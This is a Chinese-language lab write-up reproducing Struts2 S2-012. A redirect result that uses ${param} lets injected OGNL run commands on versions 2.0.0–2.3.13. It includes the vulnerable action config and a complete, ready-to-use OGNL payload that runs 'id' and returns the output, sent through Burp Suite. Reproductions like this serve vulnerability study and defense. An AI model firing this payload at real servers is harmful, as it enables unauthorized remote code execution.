# Struts2_012_远程代码执行

###### by ADummy

### 0x00利用路线

​			burpuite抓包--->修改payload--->重放包--->代码执行--->有回显

### 0x01漏洞介绍

​		如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，例如：

```java
<package name="S2-012" extends="struts-default">
    <action name="user" class="com.demo.action.UserAction">
        <result name="redirect" type="redirect">/index.jsp?name=${name}</result>
        <result name="input">/index.jsp</result>
        <result name="success">/index.jsp</result>
    </action>
</package>
```

这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行。

​			影响版本

  		2.0.0 - 2.3.13

### 0x02漏洞复现

#### payload：

%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"**id**"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}

（需要对payload进行url编码）

​			登录界面

![S2_012_rce_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_012_rce_1.png)

​			Burpsuite改包重放，有回显，发现id被执行

![S2_012_rce_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_012_rce_2.jpg)



### 0x03参考资料

https://www.cnblogs.com/Feng-L/p/13644856.html

https://blog.csdn.net/qq_29647709/article/details/84950274